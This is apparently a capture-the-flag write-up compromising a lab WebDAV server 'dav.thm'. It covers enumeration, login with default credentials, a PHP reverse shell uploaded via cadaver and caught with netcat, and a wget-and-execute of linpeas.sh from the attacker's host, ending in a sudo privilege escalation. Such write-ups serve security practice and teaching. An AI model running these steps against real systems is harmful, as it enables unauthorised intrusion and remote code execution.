# Setting up
## /etc/hosts
```sh
sami@bt:~/Documents/THM/CTFs/Dav$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	bt
10.10.211.182	dav.thm
```
# Enumeration 
## ping
```sh
sami@bt:~/Documents/THM/CTFs/Dav$ ping dav.thm        
PING dav.thm (10.10.211.182) 56(84) bytes of data.
64 bytes from dav.thm (10.10.211.182): icmp_seq=1 ttl=63 time=70.6 ms
64 bytes from dav.thm (10.10.211.182): icmp_seq=2 ttl=63 time=70.4 ms
^C
--- dav.thm ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 70.443/70.504/70.566/0.061 ms
```
## port scan with [[Nmap]]
```sh
sami@bt:~/Documents/THM/CTFs/Dav$ sudo nmap -A -p- -oN nmap_results.txt dav.thm      
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-12 20:50 EET
Nmap scan report for dav.thm (10.10.211.182)
Host is up (0.071s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=11/12%OT=80%CT=1%CU=40995%PV=Y%DS=2%DC=T%G=Y%TM=636FEB
OS:2D%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST
OS:11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   72.81 ms 10.11.0.1
2   72.95 ms dav.thm (10.10.211.182)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.56 seconds
```
### Notes:
- http on port 80
## dav.thm
![[Pasted image 20221112205354.png]]
## Directory enumeration with [[Gobuster]]
```sh
sami@bt:~/Documents/THM/CTFs/Dav$ gobuster dir -u http://dav.thm/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -o gobuster_results.txt -x txt,php,html,js -t 20
/.htaccess            (Status: 403) [Size: 291]
/.htaccess.txt        (Status: 403) [Size: 295]
/.htaccess.php        (Status: 403) [Size: 295]
/.htaccess.js         (Status: 403) [Size: 294]
/.htpasswd.txt        (Status: 403) [Size: 295]
/.htpasswd.php        (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 291]
/.htaccess.html       (Status: 403) [Size: 296]
/.htpasswd.html       (Status: 403) [Size: 296]
/.htpasswd.js         (Status: 403) [Size: 294]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 295]
/webdav               (Status: 401) [Size: 454]
```
### Notes:
- `/webdav` is interesting
## /webdav
![[Pasted image 20221112211254.png]]
### Notes:
- Login form with `Username` and `Password`
## Capturing the request and analyzing it with [[BurpSuite]]
![[Pasted image 20221112212024.png]]
### Notes:
- `YWRtaW46YWRtaW4=` is a base64 encoded text. 
- Decoding the base64 text gives us: admin:admin
## Searching for WebDav default credentials
- `jigsaw:jigsaw` to base64 gives: `amlnc2F3OmppZ3Nhdwo=`
- `wampp:xampp`to base64 gives: `d2FtcHA6eGFtcHAK`
## Modifying the request in BrupSuite
- Testing `jigsaw:jigsaw` as `amlnc2F3OmppZ3Nhdwo=`
	- Failed login ![[Pasted image 20221112215243.png]]
- Testing `wampp:xampp` as `d2FtcHA6eGFtcHAK`
	- Successful login ![[Pasted image 20221112215230.png]]
## visiting http://dav.thm/webdav/
![[Pasted image 20221112215507.png]]
## password.dav
`wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91`
### Notes: 
- wampp password hash
## hash cracking with [[hashcat]]
```sh
sami@bt:~/Documents/THM/CTFs/Dav$ hashid '$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91'   
Analyzing '$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91'
[+] MD5(APR) 
[+] Apache MD5 
```
- Searching in hashcat examples page we get:
	- 1600 	Apache $apr1$ MD5, md5apr1, MD5 (APR) 2 	`$apr1$71850310$gh9m4xcAn3MGxogwX/ztb.`
```sh
hashcat -a 0 -m 1600 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -o hashcat_results.txt
Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
Time.Started.....: Sat Nov 12 22:25:46 2022 (47 secs)
Time.Estimated...: Sat Nov 12 22:26:33 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   304.0 kH/s (5.02ms) @ Accel:32 Loops:125 Thr:128 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[2121464c5965727332303037] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Temp: 49c Fan:  0% Util: 13% Core:1987MHz Mem:3898MHz Bus:4

Started: Sat Nov 12 22:25:45 2022
Stopped: Sat Nov 12 22:26:34 2022
```
### Notes:
- Unable to gt the password with rockyou.txt wordlist
- at this point I'm checking [https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/] notes on how to proceed with webdav.
## [[davtest]]
```sh
sami@bt:~/Documents/THM/CTFs/Dav$ davtest -url http://dav.thm/webdav -auth wampp:xampp
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://dav.thm/webdav
********************************************************
NOTE	Random string for this session: Z5ixIq0yfAhUap
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap
********************************************************
 Sending test files
PUT	txt	SUCCEED:	http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.txt
PUT	html	SUCCEED:	http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.html
PUT	cgi	SUCCEED:	http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.cgi
PUT	cfm	SUCCEED:	http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.cfm
PUT	jhtml	SUCCEED:	http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.jhtml
PUT	pl	SUCCEED:	http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.pl
PUT	php	SUCCEED:	http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.php
PUT	shtml	SUCCEED:	http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.shtml
PUT	asp	SUCCEED:	http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.asp
PUT	jsp	SUCCEED:	http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.jsp
PUT	aspx	SUCCEED:	http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.aspx
********************************************************
 Checking for test file execution
EXEC	txt	SUCCEED:	http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.txt
EXEC	html	SUCCEED:	http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.html
EXEC	cgi	FAIL
EXEC	cfm	FAIL
EXEC	jhtml	FAIL
EXEC	pl	FAIL
EXEC	php	SUCCEED:	http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.php
EXEC	shtml	FAIL
EXEC	asp	FAIL
EXEC	jsp	FAIL
EXEC	aspx	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap
PUT File: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.txt
PUT File: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.html
PUT File: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.cgi
PUT File: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.cfm
PUT File: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.jhtml
PUT File: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.pl
PUT File: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.php
PUT File: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.shtml
PUT File: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.asp
PUT File: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.jsp
PUT File: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.aspx
Executes: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.txt
Executes: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.html
Executes: http://dav.thm/webdav/DavTestDir_Z5ixIq0yfAhUap/davtest_Z5ixIq0yfAhUap.php
```
### Notes:
- As a results from this test we can see that we're able to upload in many formats but we're only able to execute `.txt , .html , .php` where `.php` is being the most useful option between them all.
# Exploitation
## [[cadaver]]
```sh
sami@bt:~/Documents/THM/CTFs/Dav$ cadaver --help
Usage: cadaver [OPTIONS] http://hostname[:port]/path
  Port defaults to 80, path defaults to '/'
Options:
  -t, --tolerant            Allow cd/open into non-WebDAV enabled collection.
  -r, --rcfile=FILE         Read script from FILE instead of ~/.cadaverrc.
  -p, --proxy=PROXY[:PORT]  Use proxy host PROXY and optional proxy port PORT.
  -V, --version             Display version information.
  -h, --help                Display this help message.
Please send bug reports and feature requests via <https://github.com/notroj/cadaver>
sami@bt:~/Documents/THM/CTFs/Dav$ cadaver http://dav.thm/webdav
Authentication required for webdav on server `dav.thm':
Username: wampp
Password: 
dav:/webdav/> ?
Available commands: 
 ls         cd         pwd        put        get        mget       mput       
 edit       less       mkcol      cat        delete     rmcol      copy       
 move       lock       unlock     discover   steal      showlocks  version    
 checkin    checkout   uncheckout history    label      propnames  chexec     
 propget    propdel    propset    search     set        open       close      
 echo       quit       unset      lcd        lls        lpwd       logout     
 help       describe   about      
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_Z5ixIq0yfAhUap              0  Nov 12 22:34
        passwd.dav                            44  Aug 26  2019
dav:/webdav/> pwd
Current collection is `http://dav.thm/webdav/'.
dav:/webdav/> put hash.txt
Uploading hash.txt to `/webdav/hash.txt':
Progress: [=============================>] 100.0% of 38 bytes succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_Z5ixIq0yfAhUap              0  Nov 12 22:34
        hash.txt                              38  Nov 12 22:48
        passwd.dav                            44  Aug 26  2019
```
- Uploading works, let's upload the php reverse shell and run it. 
```
dav:/webdav/> put prs.php
Uploading prs.php to `/webdav/prs.php':
Progress: [=============================>] 100.0% of 5492 bytes succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_Z5ixIq0yfAhUap              0  Nov 12 22:34
        hash.txt                              38  Nov 12 22:48
        passwd.dav                            44  Aug 26  2019
        prs.php                             5492  Nov 12 22:50
dav:/webdav/> 
```
![[Pasted image 20221112225342.png]]
```sh
sami@bt:~/Documents/THM/CTFs/Dav$ nc -nvlp 1234          
listening on [any] 1234 ...
connect to [10.11.4.14] from (UNKNOWN) [10.10.211.182] 36434
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 12:50:55 up  2:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
# Post-Exploit-Enum
```sh
$ cd /tmp
$ ls
VMwareDnD
systemd-private-1619e4b07258440d9c6c4297a20e3c5b-systemd-timesyncd.service-wx861Y
$ which wget 
/usr/bin/wget
$ wget http://10.11.4.14:8001/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
--2022-11-12 12:59:55--  http://10.11.4.14:8001/linpeas.sh
Connecting to 10.11.4.14:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 827827 (808K) [text/x-sh]
Saving to: 'linpeas.sh'

╔══════════╣ CVEs Check
Potentially Vulnerable to CVE-2022-2588

[+] [CVE-2016-5195] dirtycow
[+] [CVE-2016-5195] dirtycow 2

╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2
  [1] af_packet
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat

$ sudo cat /root/root.txt
```
# Done